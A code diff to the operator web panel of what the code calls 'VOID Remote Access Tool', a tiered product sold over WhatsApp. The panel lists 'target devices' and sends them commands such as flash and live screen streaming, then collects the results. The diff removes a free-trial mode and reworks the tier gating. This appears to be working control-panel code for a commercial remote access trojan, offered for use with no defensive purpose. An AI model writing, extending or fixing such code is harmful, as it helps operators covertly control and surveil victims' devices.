     state.commandsUsed = j.commands_used || 0;
 
-    closeLogin();
     $('landing').style.display = 'none';
     $('topbarLanding').style.display = 'none';
     $('panel').classList.add('active');
 
     updateTierUI();
     loadDevices();
-  }catch(e){ showToast('Server unreachable'); }
-});
-
-// ---------- FREE TRIAL ----------
-function startFreeTrial(){
-  state.token = 'free_' + Date.now();
-  state.userId = 'FREE';
-  state.isAdmin = false;
-  state.tier = 'free';
-  state.commandsUsed = 0;
-
-  closeLogin();
-  $('landing').style.display = 'none';
-  $('topbarLanding').style.display = 'none';
-  $('panel').classList.add('active');
-
-  updateTierUI();
-
-  const waMsg = encodeURIComponent('Hi, I want to buy a user code for VOID Remote Access Tool. I am on the FREE trial and want to upgrade.');
-  $('deviceListContainer').innerHTML =
-    '<div style="text-align:center;padding:36px 20px;background:linear-gradient(180deg,#141f38,#0f1729);border:1px solid #1e2c4d;border-radius:16px;">' +
-      '<div style="font-size:44px;margin-bottom:14px;">🔓</div>' +
-      '<div style="font-size:16px;font-weight:800;color:#fff;margin-bottom:8px;">Free Tier — Limited Access</div>' +
-      '<div style="font-size:13px;color:#8894b5;line-height:1.65;margin-bottom:22px;">' +
-        'Free tier gives you <strong style="color:#00e676;">3 commands total</strong>.<br>' +
-        'To connect a target device, you need a user code.<br><br>' +
-        'Message us on WhatsApp to buy a code.' +
-      '</div>' +
-      '<a href="https://wa.me/' + WHATSAPP + '?text=' + waMsg + '" ' +
-        'style="display:inline-block;padding:14px 22px;background:linear-gradient(135deg,#25d366,#128c7e);color:#fff;border-radius:12px;font-weight:800;letter-spacing:.15em;font-size:12px;text-decoration:none;">' +
-        '💬 MESSAGE ON WHATSAPP' +
-      '</a>' +
-    '</div>';
+  }catch(e){
+    showToast('Server unreachable');
+  }
 }
 
 $('logoutBtn').addEventListener('click', function(){
   state.token = null; state.userId = null; state.currentDevice = null;
   state.isAdmin = false; state.tier = 'free'; state.commandsUsed = 0;
   state.liveOn = false; state.flashOn = false; state.lastResultId = 0;
+  state.pendingCode = null; state.pendingTier = null;
   if(state.pollTimer) clearInterval(state.pollTimer);
   $('panel').classList.remove('active');
   $('landing').style.display = 'block';
@@ -573,25 +661,18 @@ function updateTierUI(){
   const badge = $('tierBadge');
   const counter = $('tierCounter');
   const upgradeBtn = $('tierUpgradeBtn');
-  const tier = state.isAdmin ? 'vip' : state.tier;
 
   if (state.isAdmin) {
     badge.className = 'tier-badge vip';
     badge.textContent = 'ADMIN';
-    counter.textContent = 'Unlimited access · All devices';
+    counter.textContent = 'Unlimited · All devices';
     upgradeBtn.style.display = 'none';
-  } else if (state.userId === 'FREE') {
-    badge.className = 'tier-badge free';
-    badge.textContent = 'FREE TRIAL';
-    const remaining = Math.max(0, TIER_LIMITS.free - state.commandsUsed);
-    counter.textContent = remaining + '/' + TIER_LIMITS.free + ' commands remaining';
-    upgradeBtn.style.display = 'block';
-  } else if (tier === 'vip') {
+  } else if (state.tier === 'vip') {
     badge.className = 'tier-badge vip';
     badge.textContent = 'VIP';
     counter.textContent = 'Unlimited commands';
     upgradeBtn.style.display = 'none';
-  } else if (tier === 'pro') {
+  } else if (state.tier === 'pro') {
     badge.className = 'tier-badge pro';
     badge.textContent = 'PRO';
     const remaining = Math.max(0, TIER_LIMITS.pro - state.commandsUsed);
@@ -605,6 +686,7 @@ function updateTierUI(){
     upgradeBtn.style.display = 'block';
   }
 
+  const tier = state.isAdmin ? 'vip' : state.tier;
   document.querySelectorAll('.ctrl').forEach(function(el){
     const required = el.dataset.tier || 'free';
     const hasAccess = state.isAdmin || TIER_RANK[tier] >= TIER_RANK[required];
@@ -614,10 +696,6 @@ function updateTierUI(){
 }
 
 async function loadDevices(){
-  if (state.userId === 'FREE') {
-    startFreeTrial();
-    return;
-  }
   const c = $('deviceListContainer');
   c.innerHTML = '<div class="loading">LOADING</div>';
   try{
@@ -647,7 +725,8 @@ async function openDevice(userId){
   $('detailSub').textContent = 'LOADING INFO';
   $('outputBox').innerHTML = '<div class="empty">WAITING FOR COMMAND</div>';
   document.querySelectorAll('.ctrl').forEach(function(c){ c.classList.remove('active'); });
-  showScreen('screenDetail');
+  document.querySelectorAll('.screen').forEach(function(s){ s.classList.remove('active'); });
+  $('screenDetail').classList.add('active');
   try{
     const r = await fetch(SERVER+'/client?id='+encodeURIComponent(userId));
     const j = await r.json();
@@ -664,7 +743,8 @@ async function openDevice(userId){
 $('backBtn').addEventListener('click', function(){
   if(state.pollTimer) clearInterval(state.pollTimer);
   state.pollTimer = null;
-  showScreen('screenList');
+  document.querySelectorAll('.screen').forEach(function(s){ s.classList.remove('active'); });
+  $('screenList').classList.add('active');
   loadDevices();
 });
 
@@ -710,9 +790,7 @@ document.querySelectorAll('.ctrl').forEach(function(el){
         else showToast('Send failed: ' + (j.err||'unknown'));
         return;
       }
-      if (!state.isAdmin && state.tier !== 'vip' && state.userId !== 'FREE') {
-        state.commandsUsed++; updateTierUI();
-      }
+      if (!state.isAdmin && state.tier !== 'vip') { state.commandsUsed++; updateTierUI(); }
       if(cmd !== 'led_test' && cmd !== 'display_stream') showToast('Sent: '+cmd);
     }catch(e){ showToast('Server error'); }
   });
@@ -798,14 +876,13 @@ function openImage(url){
 // ---------- UPGRADE via WhatsApp ----------
 function upgradeTier(tier){
   const price = tier === 'pro' ? '1,000' : '3,000';
-  const userCode = state.userId || 'FREE TRIAL';
   const msg = encodeURIComponent(
-    'Hi, I want to upgrade to ' + tier.toUpperCase() + ' tier on VOID Remote Access Tool.\n\n' +
-    'My current ID: ' + userCode + '\n' +
+    'Hi, I want to buy ' + tier.toUpperCase() + ' tier on VOID Remote Access Tool.\n\n' +
     'Price: ₦' + price + '\n\n' +
-    'Please send me the payment details.'
+    'Please send me payment details.'
   );
   window.open('https://wa.me/' + WHATSAPP + '?text=' + msg, '_blank');
+  closeModal();
 }
 </script>
 </body>
